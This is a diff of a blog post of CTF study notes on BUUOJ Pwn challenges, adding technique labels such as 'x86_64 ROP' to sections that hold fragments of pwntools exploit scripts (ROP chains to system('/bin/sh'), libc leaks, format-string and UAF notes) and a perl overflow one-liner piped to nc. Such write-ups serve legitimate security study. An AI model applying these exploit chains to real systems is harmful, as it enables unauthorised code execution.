@@ -1,5 +1,7 @@
 ---
 toc: true
+classes: wide
+layout: single
 title:  "信息安全学习笔记 - BUUOJ Pwn"
 date:   2020-08-26 22:15:38 +0800
 categories: 
@@ -158,6 +160,7 @@ proc.sendline(bytes(f'{len(output)}', encoding='ascii'))
 proc.interactive()
 ```
 #### jarvisoj_level0
+x86_64 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -230,7 +233,8 @@ proc.interactive()
 ```
 
 #### not_the_same_3dsctf_2016
-ROP, or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
+1. x86 ROP, 
+2. or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
 
 ```python
 #!/usr/bin/python3.6
@@ -261,6 +265,8 @@ log.info(f'output={proc.recv(numb=128)}')
 
 #### [HarekazeCTF2019]baby_rop
 
+x86_64 ROP
+
 ```python
 #!/usr/bin/python3.6
 from pwn import *
@@ -271,12 +277,11 @@ elf = ELF(filename)
 proc = process(filename)
 # proc = remote('node3.buuoj.cn', 25573)
 
-main_addr = elf.sym['main']
-log.info(f'main={hex(main_addr)}')
+ret_function = elf.sym['main']
+log.info(f'main={hex(ret_function)}')
 
 system_plt = elf.plt['system']
 log.info(f'system={hex(system_plt)}')
-
 
 # ROPgadget --binary baby_rop --string '/bin/sh'
 bin_sh_addr = 0x0000000000601048
@@ -285,10 +290,7 @@ bin_sh_addr = 0x0000000000601048
 pop_rdi_ret = 0x0000000000400683
 ret = 0x0000000000400479
 # Ubuntu 18
-payload = b'i' * (0x10 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_plt) + p64(main_addr)
-
-# with open(f'{filename}_input', 'wb') as f:
-#   f.write(payload)
+payload = b'i' * (0x10 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_plt) + p64(ret_function)
 
 proc.recvuntil(b"What's your name?")
 proc.sendline(payload)
@@ -306,13 +308,8 @@ from pwn import *
 filename = './one_gadget'
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 proc = process(filename)
-one_gadget -f /lib/x86_64-linux-gnu/libc.so.6
+# one_gadget -f /lib/x86_64-linux-gnu/libc.so.6
 one_gadget_off = 0x45216
-
-# libc = ELF('/home/ubuntu/project/libc/buuoj-ubuntu1904-x86_64-libc-2.29.so')
-# proc = remote('node3.buuoj.cn', 29405)
-# # one_gadget -f /home/ubuntu/project/libc/libc-2.29.so
-# one_gadget_off = 0x106ef8
 
 proc.recvuntil(b'here is the gift for u:')
 printf_addr = int(proc.recvuntil(b'\n'), 16)
@@ -329,6 +326,7 @@ proc.interactive()
 ```
 
 #### bjdctf_2020_babystack
+x86_64 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -353,7 +351,9 @@ p.interactive()
 ```
 
 #### ciscn_2019_n_5
-libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
+1. [libc](http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb)
+2. x86_64 ROP
+
 
 ```python
 #!/usr/bin/python3.6
@@ -397,7 +397,9 @@ p.interactive()
 ```
 
 #### ciscn_2019_s_3
-Construct `"/bin/sh"` on stack and rop via `__libc_csu_init()`, or [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
+1. Construct `"/bin/sh"` on stack, 
+2. Return to `__libc_csu_init()`,
+3. or [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
 
 ```python
 #!/usr/bin/python3.6
@@ -453,8 +455,6 @@ payload = b'/bin/sh\x00' + p64(mov_exec_ret)\
     + p64(binsh)\
     + p64(sys_call)
 
-# input()
-
 p.send(payload)
 p.interactive()
 ```
@@ -462,6 +462,8 @@ p.interactive()
 #### [HarekazeCTF2019]babyrop2
 1. Caution: address of `printf()` ends with `"\x00"` and outputs nothing
 2. Construct `"/bin/sh"` and ROP chain in .bss segment
+3. x86_64 ROP
+
 
 ```python
 #!/usr/bin/python3.6
@@ -521,7 +523,9 @@ p.interactive()
 ```
 
 #### pwn2_sctf_2016
-Flaw: only check if length<=0x20
+1. Flaw: only check if length<=0x20
+2. x86 ROP
+
 
 ```python
 #!/usr/bin/python3.6
@@ -549,7 +553,6 @@ ra_offset = 0x2c + 4
 payload_leak = b'0' * ra_offset + p32(printf_plt) + p32(vuln) + p32(printf_got)
 p.sendline(payload_leak)
 
-
 p.recvuntil(b'You said: ')
 content = p.recvline()
 log.debug(f'content={content}')
@@ -571,6 +574,7 @@ p.interactive()
 ```
 
 #### [铁人三项(第五赛区)] 2018_rop
+x86 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -607,6 +611,7 @@ p.sendline(payload)
 p.interactive()
 ```
 #### bjdctf_2020_babyrop
+x86_64 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -650,7 +655,8 @@ p.sendline(payload)
 p.interactive()
 ```
 #### ez_pz_hackover_2016
- [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
+1. [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
+2. x86 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -700,6 +706,8 @@ p.interactive()
 ```
 
 #### jarvisoj_level2_x64
+x86_64 ROP
+
 ```python
 #!/usr/bin/python3.6
 from pwn import *
@@ -726,7 +734,10 @@ p.sendline(payload)
 p.interactive()
 ```
 #### ciscn_2019_ne_5
-`system("sh")` also works... `scanf()` ignores `'\x0b'`
+1. `system("sh")` also works... 
+2. `scanf()` ignores `'\x0b'`
+3. x86 ROP
+
 
 ```python
 #!/usr/bin/python3.6
@@ -801,7 +812,8 @@ p.interactive()
 ```
 
 #### ciscn_2019_es_2
- [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
+1. [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu) on buffer
+2. x86 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -842,8 +854,10 @@ p.interactive()
 ```
 
 
-#### spwn:
-Frame faking.
+#### spwn
+1. Frame faking
+2. x86 ROP
+3. `write` instead of `puts`
 
 ```python
 #!/usr/bin/python3.6
@@ -891,6 +905,8 @@ p.interactive()
 ```
 
 #### jarvisoj_level3
+1. x86 ROP
+
 
 ```python
 #!/usr/bin/python3.6
@@ -928,7 +944,7 @@ p.interactive()
 
 #### r2t4
 
-Flaw: format string vulnerability
+1. Flaw: format string vulnerability
 
 ```python
 #!/usr/bin/python3.6
@@ -965,7 +981,7 @@ log.success(m.group())
 
 #### jarvisoj_fm
 
-Flaw: format string vulnerability
+1.Flaw: format string vulnerability
 
 ```python
 #!/usr/bin/python3.6
@@ -996,9 +1012,9 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### ydsneedgirlfriend2
+#### ydsneedgirlfriend2
 
-Flaw: UAF
+1. Flaw: UAF
 
 ```python
 #!/usr/bin/python3.6
@@ -1033,9 +1049,9 @@ p.sendlineafter(b'Index :', b'0')
 p.interactive()
 ```
 
-### guestbook
+#### guestbook
 
-不知道为啥perl命令没有输出。。。`perl -e 'print "0"x0x88 . "\x20\x06\x40\x00\x00\x00\x00\x00\n"' | nc node3.buuoj.cn 28935` 抓包没发现有什么不同的地方，猜想可能是因为perl结束的太快了：在perl输出结束之后管道就关闭了，打出EOF，在远程返回之前就结束了。
+x86_64 ROP. 不知道为啥perl命令没有输出。。。`perl -e 'print "0"x0x88 . "\x20\x06\x40\x00\x00\x00\x00\x00\n"' | nc node3.buuoj.cn 28935` 抓包没发现有什么不同的地方，猜想可能是因为perl结束的太快了：在perl输出结束之后管道就关闭了，打出EOF，在远程返回之前就结束了。
 
 
 ```python
@@ -1055,7 +1071,9 @@ content = content.split(b'\n', 1)[1]
 log.success(content)
 ```
 
-### jarvisoj_level4
+#### jarvisoj_level4
+
+x86_64 ROP
 
 ```python
 #!/usr/bin/python3.6
@@ -1093,7 +1111,8 @@ p.sendline(b'1'*(ebp_offset + 4) + p32(system_addr) + p32(ret_function) + p32(bi
 p.interactive()
 ```
 
-### bjdctf_2020_babystack2
+#### bjdctf_2020_babystack2
+x86_64 ROP
 
 ```python
 #!/usr/bin/python3.6
